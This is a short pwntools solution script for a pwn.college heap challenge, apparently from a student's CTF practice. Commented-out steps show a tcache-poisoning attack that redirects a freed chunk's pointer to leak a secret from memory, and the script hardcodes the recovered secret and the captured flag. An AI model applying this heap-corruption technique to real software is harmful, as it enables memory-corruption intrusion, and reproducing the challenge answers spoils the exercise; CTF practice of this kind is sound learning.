from pwn import *

def _malloc(index, size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free(index):
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _puts(index):
    io.sendlineafter(b": ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().strip()

def _scanf(index, data):
    io.sendlineafter(b": ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _send_flag(sec):
    io.sendlineafter(b": ", b"send_flag")
    io.sendlineafter(b"Secret: ", sec)
    io.recvuntil(b'You win! Here is your flag:\n')
    return io.recvline().strip().decode()


secret_pos = 0x429A2C
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level7.0")

# [+] Leak secret
# _malloc(0, 128); _malloc(1, 128)
# _free(1); _free(0)

# _scanf(0, p64(secret_pos + 8))
# _malloc(2, 128); _malloc(3, 128)

# part1 = _puts(3)
# info("Leak secret: " + part1.decode())

# secret = jmdcoxalghfamksa

flag = _send_flag(b'jmdcoxalghfamksa')
info("Flag: " + flag)
# Flag: pwn.college{gu4l6LC6HfJTNN3ArhpUiDp1XV6.01M4MDLxIjNyEzW}